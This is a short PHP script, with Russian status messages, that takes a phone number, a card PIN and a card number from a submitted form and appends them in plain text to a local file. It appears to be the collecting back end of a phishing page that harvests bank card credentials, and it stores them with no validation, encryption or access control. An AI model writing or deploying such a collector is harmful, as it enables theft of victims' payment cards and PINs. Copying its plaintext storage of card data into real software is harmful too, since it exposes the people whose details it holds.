<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $data = [
    'phone' => $_POST['phoneNumber'],
    'pin'   => $_POST['pinNumber'],
    'card'  => $_POST['cardNumber']
  ];

  $dataString = json_encode($data);

  $file = fopen('data.txt', 'a');

  if ($file) {
    fwrite($file, $dataString . PHP_EOL);
    fclose($file);

    echo 'Данные успешно записаны в файл';
  } else {
    echo 'Ошибка при открытии файла';
  }
}
?>
